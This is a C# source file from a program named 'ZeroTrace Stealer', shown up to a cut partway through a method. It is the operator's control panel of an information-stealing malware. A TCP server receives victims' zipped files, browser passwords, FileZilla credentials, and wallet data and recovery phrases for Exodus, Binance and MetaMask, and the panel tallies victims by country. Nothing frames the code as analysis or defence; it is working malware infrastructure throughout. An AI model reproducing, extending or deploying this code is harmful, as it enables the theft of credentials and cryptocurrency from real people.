using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net.Http;
using Microsoft.CodeAnalysis;
using System.Reflection;
using Mono.Cecil;
using System.Drawing;
using System.Threading;
using System.IO.Compression;
using DevExpress.XtraBars.Navigation;
using DevExpress.XtraEditors;
using DevExpress.XtraGrid.Columns;
using DevExpress.XtraGrid.Views.Grid;
using System.Collections.Concurrent;
using DevExpress.XtraGrid;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using ZeroTrace.Helper;

namespace ZeroTrace_Stealer
{

    public partial class Form1 : DevExpress.XtraBars.FluentDesignSystem.FluentDesignForm
    {
        public static readonly HttpClient staticHttpClient = new HttpClient();
        private string currentLanguage = "English";

        private TcpListener server;
        private int port;
        public Form1()
        {
            InitializeComponent();

        }
        public Form1(string language)
        {
            InitializeComponent();
            currentLanguage = language;
        }
        private bool isServerRunning = false; // Track the server status
        private int currentPort = -1; // Track the current port the server is using


        public class ClientData
        {
            public string IP { get; set; }
            public string Country { get; set; }
            public string OS { get; set; }
            public string FileType { get; set; }
            public string FileSize { get; set; }
            public string Exodus { get; set; }
            public string Blockchain { get; set; }
            public string Binance { get; set; }
            public string MetaMask { get; set; }
            public string FileZilla { get; set; }
            public string EdgePasswords { get; set; }
            public string ChromePasswords { get; set; }
            public string Files { get; set; }
        }



        private void InitializeGridControl6()
        {
            GridView gridView = new GridView(gridControl6);
            gridControl6.MainView = gridView;

            // Create and configure columns
            GridColumn websiteColumn = new GridColumn();
            websiteColumn.Caption = "Website";
            websiteColumn.FieldName = "Website";
            websiteColumn.Visible = true;
            websiteColumn.Width = 150;

            GridColumn usernameColumn = new GridColumn();
            usernameColumn.Caption = "Username";
            usernameColumn.FieldName = "Username";
            usernameColumn.Visible = true;
            usernameColumn.Width = 120;

            GridColumn passwordColumn = new GridColumn();
            passwordColumn.Caption = "Password";
            passwordColumn.FieldName = "Password";
            passwordColumn.Visible = true;
            passwordColumn.Width = 120;

            GridColumn disposeColumn = new GridColumn();
            disposeColumn.Caption = "Dispose";
            disposeColumn.FieldName = "Dispose";
            disposeColumn.Visible = true;
            disposeColumn.Width = 100;

            // Add columns to the GridView
            gridView.Columns.AddRange(new GridColumn[] { websiteColumn, usernameColumn, passwordColumn, disposeColumn });

            // Optional: Configure GridView properties
            gridView.OptionsBehavior.Editable = false;
            gridView.OptionsView.ShowGroupPanel = false;
            gridView.OptionsView.ShowIndicator = false;
            gridView.OptionsView.EnableAppearanceEvenRow = true;
            gridView.OptionsView.EnableAppearanceOddRow = true;
        }

        private void InitializeGridControl5()
        {
            GridView gridView = new GridView(gridControl5);
            gridControl5.MainView = gridView;

            // Create and configure columns
            GridColumn ipColumn = new GridColumn();
            ipColumn.Caption = "IP";
            ipColumn.FieldName = "IP";
            ipColumn.Visible = true;
            ipColumn.Width = 150;

            GridColumn walletColumn = new GridColumn();
            walletColumn.Caption = "Wallet";
            walletColumn.FieldName = "Wallet";
            walletColumn.Visible = true;
            walletColumn.Width = 250;

            GridColumn disposeColumn = new GridColumn();
            disposeColumn.Caption = "Dispose";
            disposeColumn.FieldName = "Dispose";
            disposeColumn.Visible = true;
            disposeColumn.Width = 100;

            // Add columns to the GridView
            gridView.Columns.AddRange(new GridColumn[] { ipColumn, walletColumn, disposeColumn });

            // Optional: Configure GridView properties
            gridView.OptionsBehavior.Editable = false;
            gridView.OptionsView.ShowGroupPanel = false;
            gridView.OptionsView.ShowIndicator = false;
            gridView.OptionsView.EnableAppearanceEvenRow = true;
            gridView.OptionsView.EnableAppearanceOddRow = true;
        }

        private void InitializeGridControl4()
        {
            DevExpress.XtraGrid.Views.Grid.GridView gridView = new DevExpress.XtraGrid.Views.Grid.GridView(gridControl4);
            gridControl4.MainView = gridView;

            // Create and configure columns
            GridColumn ipColumn = new GridColumn();
            ipColumn.Caption = "IP";
            ipColumn.FieldName = "IP";
            ipColumn.Visible = true;
            ipColumn.Width = 150;

            GridColumn walletColumn = new GridColumn();
            walletColumn.Caption = "Wallet";
            walletColumn.FieldName = "Wallet";
            walletColumn.Visible = true;
            walletColumn.Width = 250;

            GridColumn disposeColumn = new GridColumn();
            disposeColumn.Caption = "Dispose";
            disposeColumn.FieldName = "Dispose";
            disposeColumn.Visible = true;
            disposeColumn.Width = 100;

            // Add columns to the GridView
            gridView.Columns.AddRange(new GridColumn[] { ipColumn, walletColumn, disposeColumn });

            // Optional: Configure GridView properties
            gridView.OptionsBehavior.Editable = false;
            gridView.OptionsView.ShowGroupPanel = false;
            gridView.OptionsView.ShowIndicator = false;
            gridView.OptionsView.EnableAppearanceEvenRow = true;
            gridView.OptionsView.EnableAppearanceOddRow = true;
        }
        private void InitializeGridControl()
        {
            // Create a grid view
            DevExpress.XtraGrid.Views.Grid.GridView gridView = new DevExpress.XtraGrid.Views.Grid.GridView(gridControl1);
            gridControl1.MainView = gridView;



            // Create columns
            DevExpress.XtraGrid.Columns.GridColumn colIP = new DevExpress.XtraGrid.Columns.GridColumn();
            colIP.Caption = "IP";
            colIP.FieldName = "IP";
            colIP.Visible = true;
            colIP.Width = 100;

            DevExpress.XtraGrid.Columns.GridColumn colCountry = new DevExpress.XtraGrid.Columns.GridColumn();
            colCountry.Caption = "Country";
            colCountry.FieldName = "Country";
            colCountry.Visible = true;
            colCountry.Width = 80;

            DevExpress.XtraGrid.Columns.GridColumn colOS = new DevExpress.XtraGrid.Columns.GridColumn();
            colOS.Caption = "OS";
            colOS.FieldName = "OS";
            colOS.Visible = true;
            colOS.Width = 150;

            DevExpress.XtraGrid.Columns.GridColumn colFileType = new DevExpress.XtraGrid.Columns.GridColumn();
            colFileType.Caption = "File Type";
            colFileType.FieldName = "FileType";
            colFileType.Visible = true;
            colFileType.Width = 80;

            DevExpress.XtraGrid.Columns.GridColumn colFileSize = new DevExpress.XtraGrid.Columns.GridColumn();
            colFileSize.Caption = "File Size";
            colFileSize.FieldName = "FileSize";
            colFileSize.Visible = true;
            colFileSize.Width = 80;

            DevExpress.XtraGrid.Columns.GridColumn colExodus = new DevExpress.XtraGrid.Columns.GridColumn();
            colExodus.Caption = "Exodus";
            colExodus.FieldName = "Exodus";
            colExodus.Visible = true;
            colExodus.Width = 70;

            DevExpress.XtraGrid.Columns.GridColumn colBlockchain = new DevExpress.XtraGrid.Columns.GridColumn();
            colBlockchain.Caption = "Blockchain";
            colBlockchain.FieldName = "Blockchain";
            colBlockchain.Visible = true;
            colBlockchain.Width = 80;

            DevExpress.XtraGrid.Columns.GridColumn colBinance = new DevExpress.XtraGrid.Columns.GridColumn();
            colBinance.Caption = "Binance";
            colBinance.FieldName = "Binance";
            colBinance.Visible = true;
            colBinance.Width = 70;

            DevExpress.XtraGrid.Columns.GridColumn colMetaMask = new DevExpress.XtraGrid.Columns.GridColumn();
            colMetaMask.Caption = "MetaMask";
            colMetaMask.FieldName = "MetaMask";
            colMetaMask.Visible = true;
            colMetaMask.Width = 80;

            DevExpress.XtraGrid.Columns.GridColumn colFileZilla = new DevExpress.XtraGrid.Columns.GridColumn();
            colFileZilla.Caption = "FileZilla";
            colFileZilla.FieldName = "FileZilla";
            colFileZilla.Visible = true;
            colFileZilla.Width = 70;

            DevExpress.XtraGrid.Columns.GridColumn colEdgePasswords = new DevExpress.XtraGrid.Columns.GridColumn();
            colEdgePasswords.Caption = "EdgePasswords";
            colEdgePasswords.FieldName = "EdgePasswords";
            colEdgePasswords.Visible = true;
            colEdgePasswords.Width = 100;

            DevExpress.XtraGrid.Columns.GridColumn colChromePasswords = new DevExpress.XtraGrid.Columns.GridColumn();
            colChromePasswords.Caption = "ChromePasswords";
            colChromePasswords.FieldName = "ChromePasswords";
            colChromePasswords.Visible = true;
            colChromePasswords.Width = 120;

            DevExpress.XtraGrid.Columns.GridColumn colFiles = new DevExpress.XtraGrid.Columns.GridColumn();
            colFiles.Caption = "Files";
            colFiles.FieldName = "Files";
            colFiles.Visible = true;
            colFiles.Width = 70;

            // Add columns to grid view
            gridView.Columns.AddRange(new DevExpress.XtraGrid.Columns.GridColumn[] {
        colIP, colCountry, colOS, colFileType, colFileSize,
        colExodus, colBlockchain, colBinance, colMetaMask,
        colFileZilla, colEdgePasswords, colChromePasswords, colFiles
    });

            // Create the data source
            gridControl1.DataSource = new System.ComponentModel.BindingList<ClientData>();

            // Additional settings
            gridView.OptionsBehavior.Editable = false;
            gridView.OptionsView.ShowGroupPanel = false;
            gridView.OptionsSelection.EnableAppearanceFocusedCell = false;
        }

        // Update UI text based on selected language
        private void UpdateUIText()
        {
            // Only update if not English (default)
            if (LanguageSelector.SelectedLanguage == "English")
                return;

            // Update all label texts
            UpdateLabelText(label1, "label1");
            UpdateLabelText(label3, "label3");
            UpdateLabelText(label6, "label6");
            UpdateLabelText(label4, "label4");
            UpdateLabelText(label9, "label9");
            UpdateLabelText(label7, "label7");
            UpdateLabelText(label12, "label12");
            UpdateLabelText(label10, "label10");
            UpdateLabelText(label85, "label85");
            UpdateLabelText(label88, "label88");
            UpdateLabelText(label39, "label39");
            UpdateLabelText(label37, "label37");

            // For label86 which has a long text, we need special handling
            UpdateLabelText(label86, "label86");
            string longText = TranslationManager.GetTranslation(LanguageSelector.SelectedLanguage, "label86_longText");
            if (!string.IsNullOrEmpty(longText))
            {
                // For the long about text
                label86.Text = longText;
            }

            UpdateLabelText(label90, "label90");
            UpdateLabelText(label75, "label75");

            // Update buttons
            UpdateButtonText(simpleButton1, "simpleButton1");
            UpdateButtonText(simpleButton2, "simpleButton2");
            UpdateButtonText(simpleButton3, "simpleButton3");
            UpdateButtonText(simpleButton4, "simpleButton4");
            UpdateButtonText(simpleButton5, "simpleButton5");
            UpdateButtonText(simpleButton6, "simpleButton6");
            UpdateButtonText(simpleButton7, "simpleButton7");
            UpdateButtonText(simpleButton8, "simpleButton8");
            UpdateButtonText(simpleButton9, "simpleButton9");
            UpdateButtonText(simpleButton10, "simpleButton10");
            UpdateButtonText(simpleButton11, "simpleButton11");
            UpdateButtonText(simpleButton12, "simpleButton12");
            UpdateButtonText(simpleButton13, "simpleButton13");

            // Update accordion control elements
            UpdateAccordionText(accordionControlElement1, "accordionControlElement1");
            UpdateAccordionText(accordionControlElement2, "accordionControlElement2");
            UpdateAccordionText(accordionControlElement3, "accordionControlElement3");
            UpdateAccordionText(accordionControlElement4, "accordionControlElement4");
            UpdateAccordionText(accordionControlElement5, "accordionControlElement5");
            UpdateAccordionText(accordionControlElement6, "accordionControlElement6");
            UpdateAccordionText(accordionControlElement7, "accordionControlElement7");
            UpdateAccordionText(accordionControlElement8, "accordionControlElement8");
            UpdateAccordionText(accordionControlElement9, "accordionControlElement9");
        }

        // Helper method to update a label's text
        private void UpdateLabelText(Label label, string controlName)
        {
            try
            {
                if (label != null)
                {
                    string translation = TranslationManager.GetTranslation(LanguageSelector.SelectedLanguage, controlName);
                    if (!string.IsNullOrEmpty(translation))
                    {
                        label.Text = translation;
                    }
                }
            }
            catch (Exception ex)
            {
                // Just log error but don't crash
                Console.WriteLine($"Error updating text for {controlName}: {ex.Message}");
            }
        }

        // Helper method to update a button's text
        private void UpdateButtonText(SimpleButton button, string controlName)
        {
            try
            {
                if (button != null)
                {
                    string translation = TranslationManager.GetTranslation(LanguageSelector.SelectedLanguage, controlName);
                    if (!string.IsNullOrEmpty(translation))
                    {
                        button.Text = translation;
                    }
                }
            }
            catch (Exception ex)
            {
                // Just log error but don't crash
                Console.WriteLine($"Error updating text for {controlName}: {ex.Message}");
            }
        }

        // Helper method to update accordion control element text
        private void UpdateAccordionText(AccordionControlElement element, string controlName)
        {
            try
            {
                if (element != null)
                {
                    string translation = TranslationManager.GetTranslation(LanguageSelector.SelectedLanguage, controlName);
                    if (!string.IsNullOrEmpty(translation))
                    {
                        element.Text = translation;
                    }
                }
            }
            catch (Exception ex)
            {
                // Just log error but don't crash
                Console.WriteLine($"Error updating text for {controlName}: {ex.Message}");
            }
        }





        // Helper method to update a control's text
        private void UpdateControlText(Control control, string controlName)
        {
            try
            {
                if (control != null)
                {
                    string translation = TranslationManager.GetTranslation(currentLanguage, controlName);
                    if (!string.IsNullOrEmpty(translation))
                    {
                        control.Text = translation;
                    }
                }
            }
            catch (Exception ex)
            {
                // Just log error but don't crash
                Console.WriteLine($"Error updating text for {controlName}: {ex.Message}");
            }
        }

        private async void simpleButton1_Click(object sender, EventArgs e)
        {
            counting.Enabled = true;
            if (int.TryParse(textEdit1.Text, out port))
            {
                if (isServerRunning && port == currentPort)
                {
                    // If the server is running on the same port, inform the user
                    MessageBox.Show($"Server is already running on port {port}.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return; // Prevent starting the server again
                }
                // Stop the existing server if it's running on a different port
                if (isServerRunning)
                {
                    StopServer();
                }
                // Start a new server on the desired port
                server = new TcpListener(IPAddress.Any, port);
                try
                {
                    server.Start();
                    isServerRunning = true; // Mark the server as running
                    currentPort = port; // Update the current port
                    MessageBox.Show($"Server started on port {port}.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    label37.Text = "Server Running...";
                    while (isServerRunning)
                    {
                        var client = await server.AcceptTcpClientAsync();
                        _ = Task.Run(() => HandleClientAsync(client));
                    }
                }
                catch (Exception ex)
                {
                    // Added error handling with appropriate icon
                    MessageBox.Show($"Error starting server: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    isServerRunning = false;
                    currentPort = -1;
                    label37.Text = "Server Error";
                }
            }
            else
            {
                MessageBox.Show("Invalid port number.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void StopServer()
        {
            try
            {
                // Stop the server gracefully
                server.Stop();
                isServerRunning = false; // Mark the server as stopped
                currentPort = -1; // Reset the current port
                MessageBox.Show("Server stopped.");
            }
            catch (Exception ex)
            {

            }
        }


        //SERVER  
        private async Task HandleClientAsync(TcpClient client)
        {
            try
            {
                if (client == null || !client.Connected)
                    return;

                string clientIP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
                string fileName = $"Clients\\{clientIP}.zip";
                string osInfo = "Unknown";
                string exodus = "0";
                string blockchain = "0";
                string binance = "0";
                string localmetamask = "0";
                string checkfilezilla = "0";
                string checkedgepasswords = "0";
                string checkchromepasswords = "0";
                string checkfiles = "0";

                long fileSize;

                // Get country information
                string country = await GetCountryFromIPAsync(clientIP);

                // Ensure directory exists
                Directory.CreateDirectory("Clients");

                // Flag to track if initial data has been processed
                bool initialDataProcessed = false;

                using (NetworkStream stream = client.GetStream())
                {
                    // Set read timeout to prevent infinite waiting on initial data
                    stream.ReadTimeout = 60000; // 60 seconds timeout

                    // Read the first 4 bytes to determine the length of the next message
                    byte[] initialLengthBuffer = new byte[4];
                    int initialBytesRead = await stream.ReadAsync(initialLengthBuffer, 0, initialLengthBuffer.Length);
                    if (initialBytesRead < 4)
                    {
                        LogError("Failed to read initial message length");
                        return;
                    }

                    int initialLength = BitConverter.ToInt32(initialLengthBuffer, 0);

                    // Check if this is a short message (likely OS info only)
                    // bool isSimpleMessage = initialLength > 0 && initialLength < 1024;  // Assume OS info is small
                    bool isSimpleMessage = initialLength > 0 && initialLength < 20;
                    if (isSimpleMessage)
                    {
                        // This looks like the simplified protocol - just OS info followed by message

                        // Read OS info
                        byte[] osBuffer = new byte[initialLength];
                        await stream.ReadAsync(osBuffer, 0, initialLength);
                        osInfo = Encoding.UTF8.GetString(osBuffer);
                        Console.WriteLine($"Received OS info: {osInfo}");

                        // Variables to store mnemonic data
                        string currentMnemonic = "";
                        string currentPassword = "";
                        string currentAtomicMnemonic = "";
                        string currentAtomicPassword = "";
                        bool isMnemonicData = false;

                        // Now read the actual message
                        while (client.Connected)
                        {
                            try
                            {
                                if (stream.DataAvailable)
                                {
                                    // Read message length
                                    byte[] messageLengthBuffer = new byte[4];
                                    int msgLenBytesRead = await stream.ReadAsync(messageLengthBuffer, 0, messageLengthBuffer.Length);
                                    if (msgLenBytesRead < 4) continue;

                                    int messageLength = BitConverter.ToInt32(messageLengthBuffer, 0);
                                    if (messageLength <= 0 || messageLength > 1024 * 1024)
                                    {
                                        throw new Exception($"Invalid message size: {messageLength}");
                                    }

                                    // Read message content
                                    byte[] messageBuffer = new byte[messageLength];
                                    int totalMessageBytesRead = 0;
                                    while (totalMessageBytesRead < messageLength)
                                    {
                                        int bytesToRead = Math.Min(4096, messageLength - totalMessageBytesRead);
                                        int messageBytesRead = await stream.ReadAsync(
                                            messageBuffer,
                                            totalMessageBytesRead,
                                            bytesToRead);

                                        if (messageBytesRead == 0) break;
                                        totalMessageBytesRead += messageBytesRead;
                                    }

                                    if (totalMessageBytesRead < messageLength)
                                    {
                                        throw new Exception("Incomplete message");
                                    }

                                    string message = Encoding.UTF8.GetString(messageBuffer);
                                    Console.WriteLine($"Received message: {message}");

                                    // Process the message based on its content
                                    if (message == "MNEMONIC_DATA")
                                    {
                                        isMnemonicData = true;
                                        Console.WriteLine("Mnemonic data incoming...");
                                    }
                                    else if (isMnemonicData)
                                    {
                                        // Check what type of data this is
                                        if (message.StartsWith("mnemonic.txt:"))
                                        {
                                            currentMnemonic = message.Substring("mnemonic.txt:".Length).Trim();
                                        }
                                        else if (message.StartsWith("password.txt:"))
                                        {
                                            currentPassword = message.Substring("password.txt:".Length).Trim();

                                            // If we have both regular mnemonic and password, update the grid
                                            if (!string.IsNullOrEmpty(currentMnemonic) && !string.IsNullOrEmpty(currentPassword))
                                            {
                                                this.BeginInvoke(new Action(() =>
                                                {
                                                    try
                                                    {
                                                        // Update gridControl2 with regular mnemonic data
                                                        UpdateRegularMnemonicGrid(currentMnemonic, currentPassword);
                                                        Console.WriteLine("Updated gridControl2 with regular mnemonic data");

                                                        // Reset values after adding to grid
                                                        currentMnemonic = "";
                                                        currentPassword = "";
                                                    }
                                                    catch (Exception ex)
                                                    {
                                                        Console.WriteLine($"Error updating grid with regular mnemonic: {ex.Message}");
                                                    }
                                                }));
                                            }
                                        }
                                        else if (message.StartsWith("atomicmnemonic.txt:"))
                                        {
                                            currentAtomicMnemonic = message.Substring("atomicmnemonic.txt:".Length).Trim();
                                        }
                                        else if (message.StartsWith("atomicpassword.txt:"))
                                        {
                                            currentAtomicPassword = message.Substring("atomicpassword.txt:".Length).Trim();

                                            // If we have both atomic mnemonic and password, update the grid
                                            if (!string.IsNullOrEmpty(currentAtomicMnemonic) && !string.IsNullOrEmpty(currentAtomicPassword))
                                            {
                                                this.BeginInvoke(new Action(() =>
                                                {
                                                    try
                                                    {
                                                        // Update gridControl3 with atomic mnemonic data
                                                        UpdateAtomicMnemonicGrid(currentAtomicMnemonic, currentAtomicPassword);
                                                        Console.WriteLine("Updated gridControl3 with atomic mnemonic data");

                                                        // Reset values after adding to grid
                                                        currentAtomicMnemonic = "";
                                                        currentAtomicPassword = "";
                                                    }
                                                    catch (Exception ex)
                                                    {
                                                        Console.WriteLine($"Error updating grid with atomic mnemonic: {ex.Message}");
                                                    }
                                                }));
                                            }
                                        }
                                    }
                                }

                                await Task.Delay(100);
                            }
                            catch (Exception ex)
                            {
                                LogError($"Error in simple message mode: {ex.Message}");
                                if (!client.Connected) break;
                            }
                        }
                    }

                    else
                    {
                        // Go back to the beginning of the stream (we've already read 4 bytes)
                        // Continue with the original complex protocol

                        // Process initial data using the full protocol
                        await ProcessInitialDataAsync(initialLengthBuffer);

                        // After processing initial data, enter continuous monitoring mode
                        stream.ReadTimeout = 0; // Infinite timeout for persistent connection

                        // THAT'S FOR FILES THIS SHOULD WORK TOGETHER WITH ABOVE ONE
                        while (client.Connected)
                        {
                            try
                            {
                                // Check if there's data available on the stream
                                if (stream.DataAvailable)
                                {
                                    // Read message length
                                    byte[] messageLengthBuffer = new byte[4];
                                    int readBytes = await stream.ReadAsync(messageLengthBuffer, 0, messageLengthBuffer.Length);
                                    if (readBytes < 4) continue; // Not enough data yet, try again later

                                    int messageLength = BitConverter.ToInt32(messageLengthBuffer, 0);

                                    // Sanity check for message length
                                    if (messageLength <= 0 || messageLength > 1024 * 1024) // Max 1MB per message
                                    {
                                        throw new Exception($"Invalid message size: {messageLength}");
                                    }

                                    // Read message content
                                    byte[] messageBuffer = new byte[messageLength];
                                    int totalMessageBytesRead = 0;
                                    while (totalMessageBytesRead < messageLength)
                                    {
                                        int bytesToRead = Math.Min(4096, messageLength - totalMessageBytesRead);
                                        int messageBytesRead = await stream.ReadAsync(
                                            messageBuffer,
                                            totalMessageBytesRead,
                                            bytesToRead);

                                        if (messageBytesRead == 0) break; // Connection closed
                                        totalMessageBytesRead += messageBytesRead;
                                    }

                                    if (totalMessageBytesRead < messageLength)
                                    {
                                        throw new Exception("Incomplete message");
                                    }

                                    string message = Encoding.UTF8.GetString(messageBuffer);



                                    this.BeginInvoke(new Action(() =>
                                    {
                                        try
                                        {
                                            // Check if the file exists after processing
                                            if (File.Exists(fileName))
                                            {
                                                FileInfo fi = new FileInfo(fileName);

                                            }
                                            else
                                            {
                                                MessageBox.Show($"Error: ZIP file was not created at {fileName}",
                                                    "File Missing", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            LogError($"Error checking zip file: {ex.Message}");
                                        }
                                    }));


                                }

                                // Small delay to prevent high CPU usage
                                await Task.Delay(100);
                            }
                            catch (Exception ex)
                            {
                                // Log the error but don't break the loop - this allows recovering from transient errors
                                LogError($"Error processing data from persistent connection: {ex.Message}");

                                // Break if the client is no longer connected
                                if (!client.Connected)
                                    break;
                            }
                        }
                    }

                    // Local function to process initial data with the full protocol
                    async Task ProcessInitialDataAsync(byte[] initialOsLengthBuffer)
                    {
                        // We already read the OS length buffer, so use it directly
                        int osInfoLength = BitConverter.ToInt32(initialOsLengthBuffer, 0);

                        // Sanity check to prevent memory allocation attacks
                        if (osInfoLength <= 0 || osInfoLength > 1024 * 1024) // Max 1MB for OS info
                            throw new Exception("Invalid OS info size");

                        // Read OS info
                        byte[] osBuffer = new byte[osInfoLength];
                        await stream.ReadAsync(osBuffer, 0, osInfoLength);
                        osInfo = Encoding.UTF8.GetString(osBuffer);

                        // Read file size with buffer size check
                        byte[] fileSizeBuffer = new byte[8];
                        int fileSizeBytesRead = await stream.ReadAsync(fileSizeBuffer, 0, fileSizeBuffer.Length);
                        if (fileSizeBytesRead < 8) throw new Exception("Failed to read file size");

                        fileSize = BitConverter.ToInt64(fileSizeBuffer, 0);
                        // Sanity check for file size to prevent memory allocation attacks
                        if (fileSize <= 0 || fileSize > 1024 * 1024 * 100) // Max 100MB
                            throw new Exception("Invalid file size");

                        // Read file content with buffered streaming
                        using (FileStream fs = new FileStream(fileName, FileMode.Create, FileAccess.Write, FileShare.None,
                                bufferSize: 4096, useAsync: true))
                        {
                            long totalBytesRead = 0;
                            byte[] buffer = new byte[4096];
                            int readBytes;

                            while (totalBytesRead < fileSize &&
                                    (readBytes = await stream.ReadAsync(buffer, 0, (int)Math.Min(buffer.Length, fileSize - totalBytesRead))) > 0)
                            {
                                await fs.WriteAsync(buffer, 0, readBytes);
                                totalBytesRead += readBytes;

                                // Give other threads a chance to run
                                if (totalBytesRead % (1024 * 1024) == 0) // Every 1MB
                                    await Task.Delay(1);
                            }

                            // Verify received file size matches expected size
                            if (totalBytesRead != fileSize)
                                throw new Exception($"File size mismatch. Expected: {fileSize}, Received: {totalBytesRead}");
                        }

                        // Process all the message types without using ref keyword
                        var messageKeys = new[] {
                    "Exodus", "Blockchain", "Binance", "LocalMetaMask",
                    "FileZilla", "EdgePasswords", "ChromePasswords", "Files"
                };

                        // Create a dictionary to store the results
                        Dictionary<string, string> results = new Dictionary<string, string>
                {
                    { "Exodus", exodus },
                    { "Blockchain", blockchain },
                    { "Binance", binance },
                    { "LocalMetaMask", localmetamask },
                    { "FileZilla", checkfilezilla },
                    { "EdgePasswords", checkedgepasswords },
                    { "ChromePasswords", checkchromepasswords },
                    { "Files", checkfiles }
                };

                        foreach (string key in messageKeys)
                        {
                            // Read message length
                            byte[] messageLengthBuffer = new byte[4];
                            int msgBytesRead = await stream.ReadAsync(messageLengthBuffer, 0, messageLengthBuffer.Length);
                            if (msgBytesRead < 4) break; // End of stream or connection closed

                            int messageLength = BitConverter.ToInt32(messageLengthBuffer, 0);

                            // Sanity check for message length
                            if (messageLength < 0 || messageLength > 1024 * 1024) // Max 1MB per message
                            {
                                throw new Exception($"Invalid message size for {key}: {messageLength}");
                            }

                            // Skip empty messages
                            if (messageLength == 0)
                            {
                                results[key] = "0";
                                continue;
                            }

                            // Read message content
                            byte[] messageBuffer = new byte[messageLength];
                            int totalMessageBytesRead = 0;
                            while (totalMessageBytesRead < messageLength)
                            {
                                int bytesToRead = Math.Min(4096, messageLength - totalMessageBytesRead);
                                int messageBytesRead = await stream.ReadAsync(
                                    messageBuffer,
                                    totalMessageBytesRead,
                                    bytesToRead);

                                if (messageBytesRead == 0) break; // Connection closed
                                totalMessageBytesRead += messageBytesRead;
                            }

                            if (totalMessageBytesRead < messageLength)
                            {
                                throw new Exception($"Incomplete message for {key}");
                            }

                            results[key] = Encoding.UTF8.GetString(messageBuffer);

                            // Update counters for non-zero values
                            if (results[key] != "0")
                            {
                                // Use BeginInvoke to prevent UI deadlocks
                                string type = key;
                                string value = results[key];

                                this.BeginInvoke(new Action(() =>
                                {
                                    try
                                    {
                                        switch (type)
                                        {
                                            case "Exodus":
                                                label43.Text = (int.Parse(label43.Text) + 1).ToString();
                                                break;
                                            case "Blockchain":
                                                label46.Text = (int.Parse(label46.Text) + 1).ToString();
                                                break;
                                            case "Binance":
                                                label49.Text = (int.Parse(label49.Text) + 1).ToString();
                                                break;
                                            case "LocalMetaMask":
                                                label52.Text = (int.Parse(label52.Text) + 1).ToString();
                                                break;
                                            case "FileZilla":
                                                label57.Text = (int.Parse(label57.Text) + 1).ToString();
                                                break;
                                            case "EdgePasswords":
                                                label65.Text = (int.Parse(label65.Text) + 1).ToString();
                                                break;
                                            case "ChromePasswords":
                                                label61.Text = (int.Parse(label61.Text) + 1).ToString();
                                                break;
                                            case "Files":
                                                label70.Text = (int.Parse(label70.Text) + 1).ToString();
                                                break;
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        // Handle parsing errors gracefully
                                        Console.WriteLine($"Error updating counter for {type}: {ex.Message}");
                                    }
                                }));
                            }
                        }

                        // Update our variables with the values from the dictionary
                        exodus = results["Exodus"];
                        blockchain = results["Blockchain"];
                        binance = results["Binance"];
                        localmetamask = results["LocalMetaMask"];
                        checkfilezilla = results["FileZilla"];
                        checkedgepasswords = results["EdgePasswords"];
                        checkchromepasswords = results["ChromePasswords"];
                        checkfiles = results["Files"];

                        // Update country counter and GridControl with BeginInvoke to avoid UI thread issues
                        this.BeginInvoke(new Action(() =>
                        {
                            try
                            {
                                // Update country count
                                switch (country)
                                {
                                    case "US":
                                        uscount.Text = (int.Parse(uscount.Text) + 1).ToString();
                                        break;
                                    case "IT":
                                        italycount.Text = (int.Parse(italycount.Text) + 1).ToString();
                                        break;
                                    case "CA":
                                        canadacount.Text = (int.Parse(canadacount.Text) + 1).ToString();
                                        break;
                                    case "DE":
                                        germanycount.Text = (int.Parse(germanycount.Text) + 1).ToString();
                                        break;
                                    case "RO":
                                        romaniacount.Text = (int.Parse(romaniacount.Text) + 1).ToString();
                                        break;
                                    case "SE":
                                        swedencount.Text = (int.Parse(swedencount.Text) + 1).ToString();
                                        break;
                                    case "CN":
                                        chinacount.Text = (int.Parse(chinacount.Text) + 1).ToString();
                                        break;
                                    default:
                                        othercount.Text = (int.Parse(othercount.Text) + 1).ToString();
                                        break;
                                }

                                // Add new data to the GridControl
                                var dataSource = gridControl1.DataSource as System.ComponentModel.BindingList<ClientData>;
                                if (dataSource != null)
                                {
                                    dataSource.Add(new ClientData
                                    {
                                        IP = clientIP,
                                        Country = country,
                                        OS = osInfo,
                                        FileType = "ZIP",
                                        FileSize = fileSize.ToString(),
                                        Exodus = exodus,
                                        Blockchain = blockchain,
                                        Binance = binance,
                                        MetaMask = localmetamask,
                                        FileZilla = checkfilezilla,
                                        EdgePasswords = checkedgepasswords,
                                        ChromePasswords = checkchromepasswords,
                                        Files = checkfiles
                                    });

                                    // Force grid to update and scroll to the new item
                                    gridControl1.RefreshDataSource();
                                    var gridView = gridControl1.MainView as DevExpress.XtraGrid.Views.Grid.GridView;
                                    if (gridView != null && dataSource.Count > 0)
                                    {
                                        gridView.FocusedRowHandle = dataSource.Count - 1;
                                    }
                                }

                                SaveData();
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"Error updating UI: {ex.Message}");
                            }
                        }));

                        // Show received form
                        await ShowReportFormAsync();

                        // Mark that we've processed the initial data
                        initialDataProcessed = true;
                    }
                }

                CleanupMemory();
            }
            catch (OutOfMemoryException ex)
            {
                // Log the error to a file instead of showing message box to avoid UI freezes
                LogError($"Out of memory error: {ex.Message}");
                GC.Collect(); // Force garbage collection
            }
            catch (Exception ex)
            {
                // Log the error to a file instead of showing message box to avoid UI freezes
                LogError($"Client handling error: {ex.Message}");
            }
            finally
            {
                try
                {
                    client?.Close();
                    client?.Dispose();
                }
                catch { /* Ignore errors in cleanup */ }
            }
        }

        private void UpdateRegularMnemonicGrid(string mnemonic, string password)
        {
            try
            {
                // Get the data source for gridControl2
                var dataSource = gridControl2.DataSource as System.ComponentModel.BindingList<MnemonicData>;
                if (dataSource == null)
                {
                    // Initialize if not already set
                    dataSource = new System.ComponentModel.BindingList<MnemonicData>();
                    gridControl2.DataSource = dataSource;
                }

                // Add the new data
                dataSource.Add(new MnemonicData
                {
                    Mnemonic = mnemonic,
                    Password = password,
                    ReceivedTime = DateTime.Now
                });

